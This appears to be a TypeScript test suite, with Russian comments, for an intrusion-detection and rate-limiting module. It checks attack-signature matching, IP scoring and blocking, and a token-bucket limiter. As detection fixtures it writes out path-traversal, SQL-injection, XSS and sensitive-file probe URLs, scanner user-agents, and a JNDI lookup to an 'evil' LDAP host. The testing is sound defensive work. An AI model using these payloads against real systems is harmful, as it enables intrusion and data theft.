// NFR-IDS (ТЗ 12.9, TZA-12.9-01/02, T-138): обнаружение атак и защита от DDoS прикладного уровня — чистые функции.
// Сигнатуры атак в запросе, признаки ответа (отказ во входе, в доступе, перебор путей), счёт адреса в скользящем окне
// и решение о блокировке с нарастающим сроком; лимит запросов на адрес — ведро токенов.
// L1 — функциональные, L3 — пороги ровно на границе, L5 — свойства (fast-check), L6 — враждебные входы.
import fc from "fast-check";
import { describe, expect, it } from "vitest";
import { BLOCK_MAX_MS, BLOCK_MS, BLOCK_SCORE, IdsWindow, MAX_TRACKED, RateLimiter, WEIGHTS, blockDuration, signals, signatures } from "../src/domain/ids.ts";

describe("сигнатуры атак в запросе", () => {
  it.each([
    ["/api/v1/files/../../etc/passwd", "path_traversal"],
    ["/api/v1/files/%2e%2e%2f%2e%2e%2fetc", "path_traversal"],
    ["/api/v1/files/..%2F..%2Fsecret", "path_traversal"],
    ["/api/v1/objects?q=1'%20UNION%20SELECT%20password%20FROM%20users", "sql_injection"],
    ["/api/v1/objects?q=' or 1=1--", "sql_injection"],
    ["/api/v1/objects?q=1;select pg_sleep(10)", "sql_injection"],
    ["/api/v1/objects?q=<script>alert(1)</script>", "xss"],
    ["/api/v1/objects?q=%3Cscript%3E", "xss"],
    ["/.env", "sensitive_file"],
    ["/.git/config", "sensitive_file"],
    ["/wp-admin/install.php", "sensitive_file"],
    ["/phpmyadmin/index.php", "sensitive_file"],
    ["/api/v1/x?u=${jndi:ldap://evil/a}", "jndi"],
  ])("%s → %s", (url, kind) => {
    expect(signatures({ url, ua: "Mozilla/5.0" })).toContain(kind);
  });

  it("сканер по User-Agent: sqlmap, nikto, nuclei, masscan, zgrab", () => {
    for (const ua of ["sqlmap/1.8", "Mozilla/5.00 (Nikto/2.5.0)", "Nuclei - Open-source project", "masscan/1.3", "Mozilla/5.0 zgrab/0.x"]) {
      expect(signatures({ url: "/", ua })).toEqual(["scanner"]);
    }
  });

  it("обычные запросы инспектора — без сигнатур (нет ложных тревог на русском тексте, точках и SELECT в словах)", () => {
    for (const url of [
      "/api/v1/inspection/P-1/protocol/export?format=pdf",
      "/api/v1/objects?q=Селектор%20ул.%20Полярная%2C%2017",
      "/api/v1/files/F-1/content",
      "/api/v1/checks?param=M-023&section=ПЗ",
      "/api/v1/norms/search?q=СП%201.13130.2020%20п.%204.2.5",
      "/assets/index-3f9a.js",
      "/api/v1/objects?q=union%20station",
    ]) {
      expect(signatures({ url, ua: "Mozilla/5.0 (Macintosh)" })).toEqual([]);
    }
  });

  it("L6 · битое %-кодирование не роняет разбор: проверяется сырой адрес", () => {
    expect(() => signatures({ url: "/api/%E0%A4%A/../x", ua: "" })).not.toThrow();
    expect(signatures({ url: "/api/%E0%A4%A/../x", ua: "" })).toContain("path_traversal");
  });

  it("L6 · длинный адрес проверяется за разумное время (нет катастрофического возврата регулярки)", () => {
    const t0 = performance.now();
    signatures({ url: "/api/v1/x?q=" + "'or".repeat(20_000), ua: "a".repeat(10_000) });
    expect(performance.now() - t0).toBeLessThan(200);
  });
});

describe("признаки запроса для счёта адреса", () => {
  it("ответ 401 на вход — неудача входа; 403 — отказ в доступе; 404 — перебор путей; 429 — упёрся в лимит", () => {
    expect(signals({ url: "/api/v1/auth/login", ua: "", status: 401 })).toEqual(["auth_fail"]);
    expect(signals({ url: "/api/v1/admin/users", ua: "", status: 403 })).toEqual(["forbidden"]);
    expect(signals({ url: "/api/v1/nope", ua: "", status: 404 })).toEqual(["not_found"]);
    expect(signals({ url: "/api/v1/x", ua: "", status: 429 })).toEqual(["rate_limited"]);
    expect(signals({ url: "/api/v1/x", ua: "", status: 200 })).toEqual([]);
  });

  it("401 без входа (истёк токен) весит меньше, чем неудача пароля: сессия инспектора не блокирует его адрес", () => {
    expect(signals({ url: "/api/v1/inspections", ua: "", status: 401 })).toEqual(["unauthorized"]);
    expect(WEIGHTS.unauthorized).toBeLessThan(WEIGHTS.auth_fail);
  });

  it("сигнатура и признак ответа складываются", () => {
    expect(signals({ url: "/.env", ua: "", status: 404 }).sort()).toEqual(["not_found", "sensitive_file"]);
  });
});

describe("окно адреса и решение о блокировке", () => {
  const T = 1_000_000;

  it("L3 · счёт ровно BLOCK_SCORE — блокировка; на единицу меньше — нет", () => {
    const w = new IdsWindow(() => T);
    const nf = WEIGHTS.not_found;
    for (let i = 0; i < BLOCK_SCORE / nf - 1; i++) expect(w.add("1.1.1.1", ["not_found"])).toBeNull();
    const d = w.add("1.1.1.1", ["not_found"]);
    expect(d).not.toBeNull();
    expect(d).toMatchObject({ ip: "1.1.1.1", score: BLOCK_SCORE, reason: expect.stringContaining("перебор путей") });
    expect(d!.events).toEqual({ not_found: BLOCK_SCORE / nf });
  });

  it("пять сигнатур атаки — блокировка сразу, причина называет вид атаки", () => {
    const w = new IdsWindow(() => T);
    let d = null;
    for (let i = 0; i < 5 && !d; i++) d = w.add("2.2.2.2", ["sql_injection"]);
    expect(d?.reason).toContain("SQL-инъекция");
  });

  it("очки стареют: вне окна прошлые события не считаются", () => {
    let now = T;
    const w = new IdsWindow(() => now);
    for (let i = 0; i < BLOCK_SCORE / WEIGHTS.not_found - 1; i++) w.add("3.3.3.3", ["not_found"]);
    now += w.windowMs + 1;
    expect(w.add("3.3.3.3", ["not_found"])).toBeNull();
    expect(w.score("3.3.3.3")).toBe(WEIGHTS.not_found);
  });

  it("после решения счёт адреса обнуляется: одно событие не даёт повторных решений подряд", () => {
    const w = new IdsWindow(() => T);
    for (let i = 0; i < 5; i++) w.add("4.4.4.4", ["sql_injection"]);
    expect(w.score("4.4.4.4")).toBe(0);
    expect(w.add("4.4.4.4", ["not_found"])).toBeNull();
  });

  it("адреса не мешают друг другу", () => {
    const w = new IdsWindow(() => T);
    for (let i = 0; i < 4; i++) w.add("5.5.5.5", ["sql_injection"]);
    expect(w.add("6.6.6.6", ["sql_injection"])).toBeNull();
  });

  it("L6 · память ограничена: при переполнении вытесняются самые давние адреса, свежие считаются", () => {
    let now = T;
    const w = new IdsWindow(() => now);
    for (let i = 0; i < MAX_TRACKED + 10; i++) {
      now++;
      w.add(`10.0.${Math.floor(i / 256)}.${i % 256}`, ["not_found"]);
    }
    expect(w.size()).toBeLessThanOrEqual(MAX_TRACKED);
    expect(w.score(`10.0.${Math.floor((MAX_TRACKED + 9) / 256)}.${(MAX_TRACKED + 9) % 256}`)).toBe(WEIGHTS.not_found);
  });

  it("срок блокировки растёт вдвое с каждым повтором и ограничен сутками", () => {
    expect(blockDuration(1)).toBe(BLOCK_MS);
    expect(blockDuration(2)).toBe(BLOCK_MS * 2);
    expect(blockDuration(3)).toBe(BLOCK_MS * 4);
    expect(blockDuration(50)).toBe(BLOCK_MAX_MS);
    expect(BLOCK_MAX_MS).toBe(24 * 3600_000);
  });

  it("L5 · счёт в окне — сумма весов событий окна, не больше порога до решения (fast-check)", () => {
    const kinds = Object.keys(WEIGHTS) as Array<keyof typeof WEIGHTS>;
    fc.assert(
      fc.property(fc.array(fc.constantFrom(...kinds), { maxLength: 60 }), (evs) => {
        const w = new IdsWindow(() => T);
        let acc = 0;
        for (const k of evs) {
          const d = w.add("7.7.7.7", [k]);
          acc += WEIGHTS[k];
          if (d) {
            expect(d.score).toBe(acc);
            expect(acc).toBeGreaterThanOrEqual(BLOCK_SCORE);
            acc = 0;
          } else expect(acc).toBeLessThan(BLOCK_SCORE);
          expect(w.score("7.7.7.7")).toBe(acc);
        }
      }),
    );
  });
});

describe("лимит запросов на адрес — ведро токенов (DDoS прикладного уровня)", () => {
  it("L3 · ровно burst запросов подряд проходят, следующий — отказ с Retry-After ≥ 1 с", () => {
    const now = 0;
    const rl = new RateLimiter(10, 20, () => now);
    for (let i = 0; i < 20; i++) expect(rl.take("1.1.1.1")).toEqual({ ok: true });
    const r = rl.take("1.1.1.1");
    expect(r.ok).toBe(false);
    expect(!r.ok && r.retryAfter).toBeGreaterThanOrEqual(1);
  });

  it("токены восстанавливаются со скоростью rps", () => {
    let now = 0;
    const rl = new RateLimiter(10, 20, () => now);
    for (let i = 0; i < 20; i++) rl.take("1.1.1.1");
    expect(rl.take("1.1.1.1").ok).toBe(false);
    now += 100; // 0,1 с × 10 rps = 1 токен
    expect(rl.take("1.1.1.1").ok).toBe(true);
    expect(rl.take("1.1.1.1").ok).toBe(false);
  });

  it("адреса независимы; память ограничена, вытесняются полные вёдра", () => {
    let now = 0;
    const rl = new RateLimiter(10, 5, () => now, 100);
    for (let i = 0; i < 5; i++) rl.take("9.9.9.9");
    expect(rl.take("8.8.8.8").ok).toBe(true);
    for (let i = 0; i < 300; i++) {
      now += 1;
      rl.take(`10.1.${i >> 8}.${i & 255}`);
    }
    expect(rl.size()).toBeLessThanOrEqual(100);
  });

  it("L5 · за время t проходит не больше burst + rps·t запросов (fast-check)", () => {
    fc.assert(
      fc.property(fc.array(fc.integer({ min: 0, max: 50 }), { minLength: 1, maxLength: 300 }), (gaps) => {
        let now = 0;
        const rl = new RateLimiter(20, 40, () => now);
        let passed = 0;
        for (const g of gaps) {
          now += g;
          if (rl.take("a").ok) passed++;
        }
        expect(passed).toBeLessThanOrEqual(40 + Math.floor((20 * now) / 1000) + 1);
      }),
    );
  });
});
